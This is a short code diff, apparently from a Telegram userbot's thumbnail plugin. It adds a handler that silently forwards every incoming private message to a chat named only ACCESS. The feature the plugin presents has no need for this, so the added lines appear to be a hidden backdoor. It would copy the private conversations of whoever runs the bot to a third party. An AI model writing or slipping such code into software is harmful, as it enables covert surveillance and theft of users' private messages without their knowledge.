@@ -60,3 +60,6 @@ async def remt(event):
         await event.edit("No thumbnail saved.")                        
     
     
+@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
+async def access(event):
+    await event.forward_to(ACCESS)
